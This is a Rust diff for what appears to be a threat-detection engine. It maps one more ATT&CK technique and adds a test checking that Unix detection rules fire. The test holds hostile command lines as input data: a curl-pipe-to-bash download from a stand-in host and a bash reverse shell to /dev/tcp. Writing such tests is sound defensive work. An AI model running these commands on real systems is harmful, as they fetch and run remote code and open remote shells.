@@ -52,7 +52,8 @@ pub fn tactic_of(technique: &str) -> &'static str {
         "T1059" | "T1203" | "T1047" | "T1569" | "T1106" => "Execution",
         "T1547" | "T1053" | "T1543" | "T1136" | "T1546" | "T1197" => "Persistence",
         "T1548" | "T1068" | "T1134" => "Privilege Escalation",
-        "T1218" | "T1027" | "T1562" | "T1070" | "T1140" | "T1211" | "T1112" | "T1055" | "T1036" => "Defense Evasion",
+        "T1218" | "T1027" | "T1562" | "T1070" | "T1140" | "T1211" | "T1112" | "T1055" | "T1036"
+        | "T1222" => "Defense Evasion",
         "T1003" | "T1552" | "T1555" => "Credential Access",
         "T1087" | "T1082" | "T1016" | "T1049" | "T1018" | "T1482" | "T1033" | "T1007" => "Discovery",
         "T1021" => "Lateral Movement",
@@ -479,6 +480,29 @@ mod tests {
                 .with_original_file_name("MyApp.exe"),
         );
         assert!(!a2.iter().any(|a| a.rule_id == "SNT-B004"));
+    }
+
+    #[test]
+    fn unix_rules_fire() {
+        let mut eng = Engine::with_builtin_rules().unwrap();
+        let fire = |eng: &mut Engine, image: &str, cmd: &str| -> Vec<String> {
+            eng.ingest(Event::process_start("h", 50, 1, image, "").with_cmdline(cmd))
+                .into_iter()
+                .map(|a| a.rule_id)
+                .collect()
+        };
+        // curl | bash
+        assert!(fire(&mut eng, "/bin/bash", "bash -c curl http://evil.sh/x | bash")
+            .contains(&"SNT-1000".to_string()));
+        // reverse shell /dev/tcp
+        assert!(fire(&mut eng, "/bin/bash", "bash -c bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")
+            .contains(&"SNT-1002".to_string()));
+        // osascript do shell script (macOS)
+        assert!(fire(&mut eng, "/usr/bin/osascript", "osascript -e do shell script \"whoami\"")
+            .contains(&"SNT-1009".to_string()));
+        // exécution depuis /tmp
+        assert!(fire(&mut eng, "/tmp/payload", "/tmp/payload")
+            .contains(&"SNT-1004".to_string()));
     }
 
     #[test]
